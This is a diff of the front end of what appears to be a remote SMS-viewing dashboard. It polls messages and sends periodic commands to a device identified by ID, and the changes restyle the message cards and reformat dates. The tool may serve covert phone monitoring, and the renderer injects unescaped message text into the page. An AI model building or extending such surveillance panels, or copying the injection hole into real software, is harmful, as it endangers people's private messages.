@@ -8,7 +8,7 @@
     <style>
         :root {
             --bg-color: #000000;
-            --card-bg: #1c1c1e; /* Message Box ka color */
+            --card-bg: #1c1c1e; /* Card color */
             --text-main: #ffffff;
             --text-sub: #8e8e93;
             --accent: #0a84ff;
@@ -72,41 +72,49 @@
             color: var(--text-sub);
         }
 
-        /* MESSAGE LIST - BOX STYLE DESIGN */
+        /* CARD DESIGN (Div wala style) */
         .msg-list { 
             padding: 15px; 
+            display: flex; flex-direction: column; gap: 10px; 
             padding-bottom: 30px; 
-            display: flex; 
-            flex-direction: column; 
-            gap: 10px; /* Do boxes ke beech gap */
         }
 
         .msg-card {
-            background-color: var(--card-bg); /* Box ka background color */
+            background-color: var(--card-bg);
             padding: 15px;
-            border-radius: 12px; /* Gol kinare */
-            border: 1px solid var(--border); /* Halki border */
+            border-radius: 12px;
+            border: 1px solid var(--border);
             display: flex; flex-direction: column; gap: 8px;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.3); /* Thoda shadow */
+            position: relative;
         }
 
         .msg-header { 
-            display: flex; justify-content: space-between; align-items: center; 
+            display: flex; 
+            justify-content: space-between; 
+            align-items: center; 
             border-bottom: 1px solid rgba(255,255,255,0.05);
             padding-bottom: 8px;
-            margin-bottom: 4px;
+            margin-bottom: 2px;
         }
         
+        /* Name Left Side */
         .sender-name { 
             font-size: 1rem; 
             font-weight: 700; 
             color: #fff; 
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            max-width: 55%; /* Name jyada lamba ho to cut jaye */
         }
         
+        /* Date + Time Right Side */
         .msg-date { 
-            font-size: 0.75rem; 
-            color: var(--accent); /* Date ko thoda highlight kiya */
+            font-size: 0.7rem; 
+            color: var(--accent); 
             white-space: nowrap; 
+            text-align: right;
+            font-weight: 500;
         }
 
         .msg-body {
@@ -153,19 +161,19 @@
     document.addEventListener("DOMContentLoaded", () => {
         if (!DEVICE_ID) return alert("ID Missing!");
         
-        detectContactsData(); // 1. Load contacts for names
-        loadFromStorage();    // 2. Load cached SMS
-        startLiveSystem();    // 3. Start fetching
+        detectContactsData(); 
+        loadFromStorage();    
+        startLiveSystem();    
     });
 
     function startLiveSystem() {
         sendCommand();
         fetchSMS();
-        setInterval(fetchSMS, 3000); // Refresh every 3 seconds
-        setInterval(sendCommand, 15000); // Keep alive command
+        setInterval(fetchSMS, 3000); 
+        setInterval(sendCommand, 15000); 
     }
 
-    // --- LOGIC FROM CALL HISTORY (Contacts Matching) ---
+    // --- CONTACT LOGIC ---
     function detectContactsData() {
         try {
             for (let i = 0; i < localStorage.length; i++) {
@@ -194,7 +202,7 @@
         } catch (e) { return phoneNumber; }
     }
 
-    // --- LOGIC FROM CALL HISTORY (Date Parsing) ---
+    // --- DATE & TIME LOGIC ---
     function getValidDate(log) {
         let raw = log.date || log.timestamp;
         if (!raw) return null;
@@ -205,24 +213,29 @@
         }
         if (typeof raw === "string") {
             const parts = raw.match(/^(\d{1,2})[\/-](\d{1,2})[\/-](\d{4})(.*)$/);
-            if (parts) return new Date(`${parts[2]}/${parts[1]}/${parts[3]}${parts[4]}`); // MM/DD/YYYY fix
+            if (parts) return new Date(`${parts[2]}/${parts[1]}/${parts[3]}${parts[4]}`); 
             let d = new Date(raw);
             if (!isNaN(d.getTime())) return d;
         }
         return null;
     }
 
+    // UPDATED: Date + Time Format (Ex: 25/01/25 10:30 PM)
     function formatTime(dateObj) {
         if (!dateObj) return "";
-        const now = new Date();
-        const diff = now - dateObj;
         
-        // Agar aaj ka hai to sirf time dikhao
-        if (dateObj.getDate() === now.getDate() && dateObj.getMonth() === now.getMonth()) {
-            return dateObj.toLocaleString('en-US', { hour: 'numeric', minute: '2-digit', hour12: true });
-        }
-        // Purana hai to Date dikhao
-        return `${dateObj.getDate()}/${dateObj.getMonth()+1}/${String(dateObj.getFullYear()).slice(-2)}`;
+        const d = String(dateObj.getDate()).padStart(2, '0');
+        const m = String(dateObj.getMonth() + 1).padStart(2, '0');
+        const y = String(dateObj.getFullYear()).slice(-2);
+        
+        const time = dateObj.toLocaleString('en-US', { 
+            hour: 'numeric', 
+            minute: '2-digit', 
+            hour12: true 
+        });
+
+        // Date aur Time dono return karega
+        return `${d}/${m}/${y} ${time}`;
     }
 
     // --- FETCH & RENDER ---
@@ -267,20 +280,18 @@
         const container = document.getElementById("msgContainer");
         if (!data.length) { container.innerHTML = '<div class="status-msg">No Messages</div>'; return; }
 
-        // Sort: Newest First
         data.forEach(d => d._dateObj = getValidDate(d));
         data.sort((a, b) => (b._dateObj || 0) - (a._dateObj || 0));
 
-        // Optimized Rendering (Limit 100)
         container.innerHTML = data.slice(0, 100).map(sms => {
-            const name = findContactName(sms.address); // Logic from call logs
-            const dateStr = formatTime(sms._dateObj);
+            const name = findContactName(sms.address); 
+            const dateTimeStr = formatTime(sms._dateObj); // Date + Time
             
             return `
                 <div class="msg-card">
                     <div class="msg-header">
                         <span class="sender-name">${name}</span>
-                        <span class="msg-date">${dateStr}</span>
+                        <span class="msg-date">${dateTimeStr}</span>
                     </div>
                     <div class="msg-body">${sms.body || "No Content"}</div>
                 </div>
